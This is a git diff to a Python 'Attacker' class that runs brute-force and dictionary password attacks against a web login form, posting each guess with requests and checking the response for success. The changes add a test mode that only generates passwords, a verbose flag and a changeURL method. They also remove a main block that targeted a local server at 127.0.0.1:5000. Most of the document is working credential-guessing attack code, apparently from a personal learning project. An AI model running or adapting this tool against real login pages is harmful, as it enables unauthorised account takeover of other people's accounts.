@@ -3,11 +3,17 @@ import requests
 
 
 class Attacker():
-    def __init__(self, url, username="username", formTags=["Username", "Password"],
+    def __init__(self, url, username="username", testMode=True, verbose=False, formTags=["Username", "Password"],
                  attackMethods={"BruteForceAttack":BruteForceAttack(), "DictionaryAttack":DictionaryAttack()}):
 
         # url of the login page
         self.url = url
+
+        # test mode doesn't send the login requests, just gets the passwords
+        self.testMode = testMode
+
+        # prints EVERYTHING out.
+        self.verbose = verbose
 
         # username of account we are trying to hack
         self.username = username
@@ -48,21 +54,27 @@ class Attacker():
             for name, attackMethod in self.attackMethods.items():
                 if name not in attackMethods:
                     continue
-
-                print("====================================================================================\n" +
-                      str(attackMethod) + "\n" +
-                      "====================================================================================")
+                print("===========================================================================\n" + str(attackMethod))
+                n = 0
                 for password in attackMethod.generatePasswords():
+                    n += 1
+                    if self.testMode:
+                        if self.verbose:
+                            print("TEST MODE: generated password [%s]" % password)
+                        continue
                     self.data[self.formTags[1]] = password
                     response = session.post(self.url, data=self.data)
                     found = checkSuccess(response)
 
-                    print("Trying [%s] [%s] ... %s" % (self.username, password,
+                    if self.verbose:
+                        print("Trying [%s] [%s] ... %s" % (self.username, password,
                                                        "SUCCESS" if found else "FAILED"))
 
                     if found:
                         pw = password
                         break
+                print("%s generated %d passwords. Found password to be <%s>" % (name, n, pw))
+                print("===========================================================================\n")
 
         return pw
 
@@ -81,12 +93,5 @@ class Attacker():
         if method in self.attackMethods:
             return self.attackMethods[method]
 
-if __name__ == '__main__':
-    attacker = Attacker('http://127.0.0.1:5000/login')
-
-    # This will only work for my website
-    # If for some reason you want to attack another website you will have to modify this function
-    def checkSuccess(response):
-        return "HELLO" in response.content.decode()
-
-    attacker.runAttack(checkSuccess)
+    def changeURL(self, url):
+        self.url = url
